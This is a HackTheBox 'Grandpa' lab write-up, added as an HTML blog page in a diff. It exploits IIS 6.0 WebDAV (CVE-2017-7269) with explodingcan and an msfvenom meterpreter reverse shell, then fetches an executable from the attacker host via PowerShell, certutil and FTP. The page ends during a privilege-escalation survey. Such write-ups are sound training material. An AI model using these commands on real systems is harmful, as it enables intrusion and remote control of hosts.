@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.78.1" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || HackTheBox - Grandpa</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">HackTheBox - Grandpa</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="November 9, 2020">
+      Nov 9
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/hackthebox">hackthebox</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/windows">windows</a>
+    <a href="https://shiny-labs.re/tags/webdav">webdav</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <p><img src="img/image-20201104093325258.png" alt="image-20201104093325258"></p>
+<h1 id="summary">Summary</h1>
+<p>IP: 10.10.10.14</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>Microsoft IIS httpd 6.0</td>
+<td>WebDAV</td>
+</tr>
+</tbody>
+</table>
+<p>OS:  Microsoft(R) Windows(R) Server 2003, Standard Edition 5.2.3790 Service Pack 2 Build 3790 x86</p>
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>user.txt</th>
+<th>root.txt</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bdff5ec67c3cff017f2bedc146a5d869</td>
+<td>9359e905a2c35f861f6a57cecf28bb7b</td>
+</tr>
+</tbody>
+</table>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">export ip=10.10.10.14
+</code></pre></div><p>Starting with a Nmap TCP scan to discover used ports and services behind, with our usual options:</p>
+<ul>
+<li><code>-sC</code> runs defaults Nmap scripts</li>
+<li><code>-sV</code> tries to identify the software versions</li>
+<li><code>-oA</code> will output the results in files prefixed by nmap_tcp and using the formats xml, nmap and gnmap</li>
+<li><code>-p-</code> will scan all ports and not the 1000 usual ones</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">sudo nmap -O -sV -sC -oA nmap_tcp -p- $ip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 09:31 CET
+Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 66.99% done; ETC: 09:33 (0:00:41 remaining)
+Nmap scan report for 10.10.10.14
+Host is up (0.040s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods:
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Error
+| http-webdav-scan:
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   WebDAV type: Unknown
+|   Server Date: Wed, 04 Nov 2020 08:38:10 GMT
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_  Server Type: Microsoft-IIS/6.0
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (91%)
+OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
+Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows Server 2003 SP2 (90%), Microsoft Windows 2003 SP2 (89%), Microsoft Windows XP SP3 (89%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or SP3 (85%), Microsoft Windows XP SP2 or Windows Server 2003 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 130.82 seconds
+</code></pre></div><p>UDP scans (with the <code>-sU</code> flag) in the background:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">sudo nmap -sU -oA nmap_udp_light $ip
+Nmap scan report for 10.10.10.14
+Host is up (0.040s latency).
+All 1000 scanned ports on 10.10.10.14 are open|filtered
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">sudo nmap -sU -oA nmap_udp -p- $ip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 09:45 CET
+Nmap scan report for 10.10.10.14
+Host is up (0.040s latency).
+All 65535 scanned ports on 10.10.10.14 are open|filtered
+
+Nmap done: 1 IP address (1 host up) scanned in 2671.98 seconds
+</code></pre></div><p>So we&rsquo;ve got one service on port 80, a Microsoft IIS httpd 6.0 and probably a WebDAV on it and nothing on UDP.</p>
+<h2 id="strategy">Strategy</h2>
+<p>We don&rsquo;t have many targets here, only the web server and its WebDAV.</p>
+<h1 id="website---port-80">Website - port 80</h1>
+<h2 id="site">Site</h2>
+<p>Checking out the webserver at http://10.10.10.14:</p>
+<p><img src="img/image-20201104093509666.png" alt="image-20201104093509666"></p>
+<h3 id="gobuster">gobuster</h3>
+<p>Run a web scanner against it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,txt -o gobuster_raft_medium_directories.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:            http://10.10.10.14
+[+] Method:         GET
+[+] Threads:        10
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.1.0
+[+] Extensions:     asp,txt
+[+] Timeout:        10s
+===============================================================
+2020/11/04 09:37:03 Starting gobuster in directory enumeration mode
+===============================================================
+/_vti_bin (Status: 301)
+Progress: 23979 / 30001 (79.93%)[ERROR] 2020/11/04 09:42:05 [!] parse &#34;http://10.10.10.14/error\x1f_log&#34;: net/url: invalid control character in URL
+
+===============================================================
+2020/11/04 09:43:21 Finished
+===============================================================
+</code></pre></div><p>Let&rsquo;s go explore a bit&hellip;. Starting with http://10.10.10.14/_vti_bin:</p>
+<p><img src="img/image-20201104093831354.png" alt="image-20201104093831354"></p>
+<p>What&rsquo;s that <code>_vti_bin</code> directory?</p>
+<blockquote>
+<p>The SharePoint environment includes built-in Web services that can be  used to work with areas of the SharePoint object model remotely. Each  Web application Web service is installed in the <code>_vti_bin</code> directory, which maps to the following file system location: %COMMONPROGRAMFILES%\Microsoft Shared\web server extensions\12\ISAPI.</p>
+<p><a href="https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-2007/bb862916(v=office.12)?redirectedfrom=MSDN">source: MSDN</a></p>
+</blockquote>
+<p>Nothing there, moving along to the WebDAV thinggy.</p>
+<h2 id="webdav">WebDAV</h2>
+<h3 id="background">Background</h3>
+<p>What&rsquo;s WebDAV?</p>
+<blockquote>
+<p><strong>WebDAV</strong> (<strong>Web Distributed Authoring and Versioning</strong>) is an extension of the <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol">Hypertext Transfer Protocol</a> (HTTP) that allows <a href="https://en.wikipedia.org/wiki/Web_client">clients</a> to perform remote <a href="https://en.wikipedia.org/wiki/World_Wide_Web">Web</a> content authoring operations.</p>
+<p>WebDAV extends the set of standard HTTP verbs and headers allowed for <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods">request methods</a>.  The added verbs include:</p>
+<ul>
+<li>
+<p>COPY</p>
+<p>copy a resource from one <a href="https://en.wikipedia.org/wiki/Uniform_resource_identifier">URI</a> to another</p>
+</li>
+<li>
+<p>LOCK</p>
+<p>put a <a href="https://en.wikipedia.org/wiki/Lock_(computer_science)">lock</a> on a resource. WebDAV supports both shared and exclusive locks.</p>
+</li>
+<li>
+<p>MKCOL</p>
+<p>create collections (a.k.a. a <a href="https://en.wikipedia.org/wiki/Folder_(computing)">directory</a>)</p>
+</li>
+<li>
+<p>MOVE</p>
+<p>move a resource from one <a href="https://en.wikipedia.org/wiki/Uniform_resource_identifier">URI</a> to another</p>
+</li>
+<li>
+<p>PROPFIND</p>
+<p>retrieve properties, stored as <a href="https://en.wikipedia.org/wiki/XML">XML</a>, from a <a href="https://en.wikipedia.org/wiki/Web_resource">web resource</a>. It is also <a href="https://en.wikipedia.org/wiki/Method_overloading">overloaded</a> to allow one to retrieve the collection structure (also known as directory hierarchy) of a remote system.</p>
+</li>
+<li>
+<p>PROPPATCH</p>
+<p>change and delete multiple properties on a resource in a single <a href="https://en.wikipedia.org/wiki/Atomic_commit">atomic act</a></p>
+</li>
+<li>
+<p>UNLOCK</p>
+<p>remove a lock from a resource</p>
+</li>
+</ul>
+<p><a href="https://en.wikipedia.org/wiki/WebDAV">https://en.wikipedia.org/wiki/WebDAV</a></p>
+</blockquote>
+<p>The Nmap scan says that dangerous methods are allowed:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+</code></pre></div><h3 id="manual-webdav">Manual WebDAV</h3>
+<p>I picked one of them randomly and tried it on the website to see how the website would react. The <a href="https://docs.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142960(v=exchg.65)#request">MSDN</a> has some example requests, let&rsquo;s try to replicate them!</p>
+<p>Using the Firefox Developer Tools, the <code>Edit and Resend</code> functions allows us to modify the HTTP verb, let&rsquo;s change from <code>GET</code> to <code>PROPFIND</code>:</p>
+<p><img src="img/image-20201104095823319.png" alt="image-20201104095823319"></p>
+<p>We get a <code>411 Length Required</code> in answer.</p>
+<p>Okay, let&rsquo;s try adding <code>Content-Length</code> and a bunch of other headers shamelessly stolen from the MSDN example:</p>
+<p><img src="img/image-20201104100158149.png" alt="image-20201104100158149"></p>
+<p>Note: the size in <code>Content-Length</code> is automatically updated as you add/remove characters in the request body.</p>
+<p><img src="img/image-20201104100656159.png" alt="image-20201104100656159"></p>
+<p>We have a <code>207</code> in answer, with the following payload:</p>
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span class="nt">&lt;a:multistatus</span> <span class="na">xmlns:b=</span><span class="s">&#34;urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/&#34;</span> <span class="na">xmlns:c=</span><span class="s">&#34;xml:&#34;</span> <span class="na">xmlns:a=</span><span class="s">&#34;DAV:&#34;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;a:response&gt;</span>
+        <span class="nt">&lt;a:href&gt;</span>http://10.10.10.14/<span class="nt">&lt;/a:href&gt;</span>
+        <span class="nt">&lt;a:propstat&gt;</span>
+            <span class="nt">&lt;a:status&gt;</span>HTTP/1.1 200 OK<span class="nt">&lt;/a:status&gt;</span>
+            <span class="nt">&lt;a:prop&gt;</span>
+                <span class="nt">&lt;a:getcontenttype&gt;</span>application/octet-stream<span class="nt">&lt;/a:getcontenttype&gt;</span>
+                <span class="nt">&lt;a:getcontentlength</span> <span class="na">b:dt=</span><span class="s">&#34;int&#34;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/a:getcontentlength&gt;</span>
+            <span class="nt">&lt;/a:prop&gt;</span>
+        <span class="nt">&lt;/a:propstat&gt;</span>
+    <span class="nt">&lt;/a:response&gt;</span>
+<span class="nt">&lt;/a:multistatus&gt;</span>
+</code></pre></div><p>The WebDAV is definitely interesting!</p>
+<p>Note: It was my first encounter with WebDAV and I lacked methodology. After reading other writeups, I should have checked if <code>PUT</code> allows us to upload files (hi webshell!). And there&rsquo;s a tool to do webdav recon called <a href="https://github.com/cldrn/davtest">davtest</a>.</p>
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<p><code>IIS  6.0</code> is pretty old, it should be vulnerable to something interesting&hellip;</p>
+<p><img src="../bashed/img/image-20201104094829814.png" alt="image-20201104094829814"></p>
+<p><code>41738</code>, <code>IIS 6.0 - WebDAV 'ScStoragePathFrontUrl Remote Buffer Overflow</code> sounds interesting enough, let&rsquo;s check it out!</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ searchsploit -m <span class="m">41738</span>
+Exploit: Microsoft IIS 6.0 - WebDAV <span class="s1">&#39;ScStoragePathFromUrl&#39;</span> Remote Buffer Overflow
+      URL: https://www.exploit-db.com/exploits/41738
+     Path: /usr/share/exploits/exploit-db/exploitdb/exploits/windows/remote/41738.py
+File Type: ASCII text, with very long lines, with CRLF line terminators
+
+Copied to: /mnt/hgfs/grandpa/41738.py
+</code></pre></div><p>Some links about this vulnerability:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/41738">https://www.exploit-db.com/exploits/41738</a></li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269">CVE-2017-7269</a></li>
+<li><a href="https://github.com/danigargu/explodingcan">explodingcan</a></li>
+</ul>
+<p>The shellcode in the original PoC didn&rsquo;t launch a shell but just a <code>calc.exe</code>. One option could be to replace it with a shellcode generated with <code>msfvenom</code>. Or I could use <a href="https://github.com/danigargu/explodingcan">explodingcan</a>, a reimplementation in Python of the same exploit.</p>
+<h1 id="shell-as-network-service">Shell as network service</h1>
+<h2 id="explodingcan">explodingcan</h2>
+<p>The README includes the msfvenom command to generate the shellcode, which must use alphanumeric chars only:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed <span class="nv">LHOST</span><span class="o">=</span>10.10.14.25 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> &gt; shellcode
+<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
+Found <span class="m">1</span> compatible encoders
+Attempting to encode payload with <span class="m">1</span> iterations of x86/alpha_mixed
+x86/alpha_mixed succeeded with size <span class="m">744</span> <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
+x86/alpha_mixed chosen with final size <span class="m">744</span>
+Payload size: <span class="m">744</span> bytes
+</code></pre></div><p>Next, I started a listener on my host with:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nc -lvp <span class="m">4444</span>
+</code></pre></div><p>For some unknown reason, I wasn&rsquo;t able to keep a reverse shell with  <code>nc</code>, it would close immediately. As  a fallback, I used metasploit&rsquo;s handler. Maybe because of meterpreter?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf5 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.25:4444
+[*] Sending stage (176195 bytes) to 10.10.10.14
+[*] Meterpreter session 1 opened (10.10.14.25:4444 -&gt; 10.10.10.14:1035) at 2020-11-04 10:27:19 +0100
+
+</code></pre></div><p>Run the exploit:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ python2 explodingcan.py http://10.10.10.14 shellcode
+<span class="o">[</span>*<span class="o">]</span> Using URL: http://10.10.10.14
+<span class="o">[</span>*<span class="o">]</span> Server found: Microsoft-IIS/6.0
+<span class="o">[</span>-<span class="o">]</span> Unable to determine IIS path size
+</code></pre></div><p>Buh. It&rsquo;s definitely not the most stable exploit in the world&hellip; Since it&rsquo;s a buffer overflow, it tends to put the machine in a really weird state. I advise lots and lots of resets on this machine:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ python2 explodingcan.py http://10.10.10.14 shellcode
+<span class="o">[</span>*<span class="o">]</span> Using URL: http://10.10.10.14
+<span class="o">[</span>*<span class="o">]</span> Server found: Microsoft-IIS/6.0
+<span class="o">[</span>*<span class="o">]</span> Found IIS path size: <span class="m">18</span>
+<span class="o">[</span>*<span class="o">]</span> Default IIS path: C:<span class="se">\I</span>netpub<span class="se">\w</span>wwroot
+<span class="o">[</span>*<span class="o">]</span> WebDAV request: OK
+<span class="o">[</span>*<span class="o">]</span> Payload len: <span class="m">2241</span>
+<span class="o">[</span>*<span class="o">]</span> Sending payload...
+</code></pre></div><p>We get a shell as <code>NT AUTHORITY\NETWORK SERVICE</code> :</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; getuid
+Server username: NT AUTHORITY\NETWORK SERVICE
+meterpreter &gt; sysinfo
+Computer        : GRANPA
+OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x86/windows
+</code></pre></div><h2 id="usertxt">User.txt</h2>
+<p>And that should be enough to get <code>user.txt</code> !</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\D</span>ocuments and Settings&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 246C-D7FE
+
+ Directory of C:<span class="se">\D</span>ocuments and Settings
+
+04/12/2017  05:32 PM    &lt;DIR&gt;          .
+04/12/2017  05:32 PM    &lt;DIR&gt;          ..
+04/12/2017  04:12 PM    &lt;DIR&gt;          Administrator
+04/12/2017  04:03 PM    &lt;DIR&gt;          All Users
+04/12/2017  04:32 PM    &lt;DIR&gt;          Harry
+               <span class="m">0</span> File<span class="o">(</span>s<span class="o">)</span>              <span class="m">0</span> bytes
+               <span class="m">5</span> Dir<span class="o">(</span>s<span class="o">)</span>  18,094,510,080 bytes free
+</code></pre></div><p>Or not <code>¯\_(ツ)_/¯</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\Documents and Settings&gt;cd Harry
+cd Harry
+Access is denied.
+</code></pre></div><p>Nevermind huh, let&rsquo;s go for the root account then ~~</p>
+<h1 id="privesc">Privesc</h1>
+<h2 id="finding-a-location">Finding a location</h2>
+<p>Surprisingly, finding a writable directory did take some work, I ended up going for the temporary default directory:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\Documents and Settings&gt;echo %TEMP%
+C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp
+</code></pre></div><p>Alright, we can write there:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt; echo &#34;hi&#34; &gt; test.txt
+C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 246C-D7FE
+
+ Directory of C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp
+
+11/04/2020  05:52 PM    &lt;DIR&gt;          .
+11/04/2020  05:52 PM    &lt;DIR&gt;          ..
+11/04/2020  05:52 PM                 7 test.txt
+               1 File(s)              7 bytes
+               2 Dir(s)  18,093,899,776 bytes free
+</code></pre></div><h2 id="transfering-files">Transfering files</h2>
+<p>Lots of trial&rsquo;n&rsquo;errors also there&hellip; I started with powershell. I know, a bit optimistic on a Windows Server 2003&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">powershell -c &#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.25:9005/Taihou32.exe&#39;, &#39;C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp\Taihou32.exe&#39;)&#34;
+&#39;powershell&#39; is not recognized as an internal or external command,
+operable program or batch file.
+</code></pre></div><p>No powershell, <code>certutil</code> maybe? The binary was there, but the syntax I usually use to download files didn&rsquo;t worked:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;certutil -urlcache -f http://10.10.14.25/Taihou32.exe Taihou32.exe
+certutil -v -urlcache -f &#34;http://10.10.14.25/Taihou32.exe&#34; Taihou32.exe
+CertUtil: -URLCache command FAILED: 0x80070057 (WIN32: 87)
+CertUtil: The parameter is incorrect.
+</code></pre></div><p>Buh, what else? TFTP?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt; tftp -h
+&#39;tftp&#39; is not recognized as an internal or external command,
+operable program or batch file.
+</code></pre></div><p>Nope&hellip; FTP then?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;ftp -h
+ftp -h
+
+Transfers files to and from a computer running an FTP server service
+(sometimes called a daemon). Ftp can be used interactively.
+</code></pre></div><p>Finally! Something. I started a FTP server on the host:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo python2 -m pyftpdlib -p 21
+[I 2020-11-05 10:36:26] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=58165 &lt;&lt;&lt;
+[I 2020-11-05 10:36:26] concurrency model: async
+[I 2020-11-05 10:36:26] masquerade (NAT) address: None
+[I 2020-11-05 10:36:26] passive ports: None
+</code></pre></div><p>On the target, create a <code>ftp.txt</code> with all the FTP commands:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">echo open 10.10.14.25&gt;ftp.txt&amp;echo anonymous&gt;&gt;ftp.txt&amp;echo anonymous@&gt;&gt;ftp.txt&amp;echo binary&gt;&gt;ftp.txt&amp;echo get exploit.exe&gt;&gt;ftp.txt&amp;echo bye&gt;&gt;ftp.txt
+</code></pre></div><p>Then connect and execute the commands in the file:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt; ftp -s:ftp.txt
+ftp -s:ftp.txt
+User (10.10.14.25:(none)): open 10.10.14.25
+
+binary
+get exploit.exe
+bye
+</code></pre></div><h2 id="finding-a-vulnerability">Finding a vulnerability</h2>
+<p>Let&rsquo;s get some details info on the box with <code>systeminfo</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\DOCUME~1\NETWOR~1\LOCALS~1\Temp&gt;systeminfo
+systeminfo
+
+Host Name:                 GRANPA
+OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
+OS Version:                5.2.3790 Service Pack 2 Build 3790
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Uniprocessor Free
+Registered Owner:          HTB
+Registered Organization:   HTB
+Product ID:                69712-296-0024942-44782
+Original Install Date:     4/12/2017, 5:07:40 PM
+System Up Time:            0 Days, 0 Hours, 19 Minutes, 5 Seconds
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1998 Mhz
+BIOS Version:              INTEL  - 6040000
+Windows Directory:         C:\WINDOWS
+System Directory:          C:\WINDOWS\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
+Total Physical Memory:     1,023 MB
+Available Physical Memory: 796 MB
+Page File: Max Size:       2,470 MB
+Page File: Available:      2,327 MB
+Page File: In Use:         143 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: Q147222
+Network Card(s):           N/A
+</code></pre></div><p>I copied the output of <code>systeminfo</code> into a <code>systeminfo.txt</code>and ran <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows Exploit Suggester</a>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ python2 windows-exploit-suggester.py --database 2020-11-04-mssb.xls --systeminfo /mnt/hgfs/grandpa/loot/systeminfo.txt
+[*] initiating winsploit version 3.3...
+[*] database file detected as xls or xlsx based on extension
+[*] attempting to read from the systeminfo input file
+[+] systeminfo input file read successfully (ascii)
+[*] querying database file for potential vulnerabilities
+[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
+[*] there are now 356 remaining vulns
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as &#39;Windows 2003 SP2 32-bit&#39;
+[*]
+[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
+[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
+[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
+[*]
+[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
+[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
+[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
+[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
+[*]
+[E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
+[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
+[*]
+[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
+[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
+[*]
+[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
+[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
+[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
+[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC
+[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF
+[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
+[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
+[*]
